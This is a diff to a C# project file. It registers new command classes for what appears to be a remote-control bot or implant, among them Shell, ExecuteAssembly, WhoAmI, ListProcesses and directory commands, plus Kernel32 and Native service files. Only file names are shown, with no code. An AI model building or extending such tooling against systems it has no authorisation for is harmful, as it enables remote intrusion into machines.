@@ -211,8 +211,17 @@
     </Reference>
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Commands\Implements\ChangeDirectory.cs" />
+    <Compile Include="Commands\Implements\CreateDirectory.cs" />
+    <Compile Include="Commands\Implements\DeleteDirectory.cs" />
+    <Compile Include="Commands\Implements\ExecuteAssembly.cs" />
     <Compile Include="Commands\Implements\KillBot.cs" />
+    <Compile Include="Commands\Implements\ListDirectory.cs" />
+    <Compile Include="Commands\Implements\ListProcesses.cs" />
     <Compile Include="Commands\Implements\PingBot.cs" />
+    <Compile Include="Commands\Implements\PrintWorkingDirectory.cs" />
+    <Compile Include="Commands\Implements\Shell.cs" />
+    <Compile Include="Commands\Implements\WhoAmI.cs" />
     <Compile Include="Commands\Interfaces\BotCommand.cs" />
     <Compile Include="Models\BotCharacter.cs" />
     <Compile Include="Models\BotTask.cs" />
@@ -220,15 +229,17 @@
     <Compile Include="Models\Config.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Services\Generic.cs" />
+    <Compile Include="Services\Internal.cs" />
+    <Compile Include="Services\Kernel32.cs" />
+    <Compile Include="Services\Native.cs" />
     <Compile Include="Utils\BotUtil.cs" />
   </ItemGroup>
   <ItemGroup>
     <None Include="App.config" />
     <None Include="packages.config" />
   </ItemGroup>
-  <ItemGroup>
-    <Folder Include="Services\" />
-  </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <Import Project="..\packages\Fody.6.5.5\build\Fody.targets" Condition="Exists('..\packages\Fody.6.5.5\build\Fody.targets')" />
   <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
